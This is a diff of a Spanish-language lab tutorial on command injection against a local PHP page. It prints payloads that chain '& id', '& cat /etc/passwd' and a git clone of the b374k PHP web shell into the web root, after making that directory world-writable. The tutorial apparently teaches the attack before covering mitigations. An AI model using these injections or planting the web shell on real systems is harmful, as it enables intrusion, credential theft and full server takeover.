@@ -75,23 +75,17 @@ Acceder a la URL y ejecutar un comando básico:
 http://localhost/rce.php
 ~~~
 
-![](images/rce1.png)
+Si introducimos una dirección ip se nos muestra si el servidor está accesible, aunque podemos **ver información del usuario** anidando consultas con el operador &, por ejemplo: 
 
-
-Si introducimos una dirección ip se nos muestra si el servidor está accesible
-
-**Ver información del usuario**
-Sin embargo podemos anudar consultas con el operador & por ejemplo 
 ~~~
 8.8.8.8 & id
 ~~~
- que nos mostraría el usuario con el que estamos ejecutando las sentencias php:
 
-![](images/rce2.png)
+![](Images/img2.png)
 
 Si se muestra información del sistema o similar (uid=1000(user) gid=1000(user)), la aplicación es vulnerable.
 
-![](images/rce3.png)
+![](Images/img2.1.png)
 
 **Intentar listar archivos del servidor:**
 
@@ -101,7 +95,7 @@ Podemos llegar a listar los archivos del directorio donde se encuentra el archiv
 ~~~
 Si se muestran archivos del sistema en pantalla, el ataque funciona.
 
-![](images/rce4.png)
+![](Images/img4.png)
 
 **Probar más comandos:**
 
@@ -109,17 +103,18 @@ Si se muestran archivos del sistema en pantalla, el ataque funciona.
 8.8.8.8 & cat /etc/passwd
 ~~~
 
-![](images/rce5.png)
+![](Images/img3.png)
 
 Si muestra el contenido de /etc/passwd, el atacante puede extraer credenciales.
 
 **Intentar descargar y ejecutar malware:**
 
-Sólo para nuestro ejemplo dar permisos de escritura a /var/www/html/
+En este caso, para nuestro ejemplo, vamos a otorgar permisos de escritura a /var/www/html a la máquina lamp_webserver
 
 ~~~
 sudo chmod -R 777 /var/www/html/
 ~~~
+
 Introducimos codigo para concatenar la ip del servidor dns de Google, con descargar el proyecto git b374k: 
 ~~~
 8.8.8.8 & git clone https://github.com/b374k/b374k.git /var/www/html/b374k
@@ -127,15 +122,13 @@ Introducimos codigo para concatenar la ip del servidor dns de Google, con descar
 
 Si lo realiza, estará instalando en el directorio b374k un shell basado en PHP. Luego podremos acceder a él y ejecutar los comandos que queramos.
 
-![](images/rce4.png)
-
 ~~~
 http://localhost/b374k/index.php
 ~~~
 
-![](images/rce14.png)
+![](Images/img5.png)
 
-El atacante tiene control total del sistema.
+En este paso, el atacante tiene control total del sistema.
 
 ### Mitigaciones de RCE
 Para las mitigaciones vamos a utilizar otros archivos: 
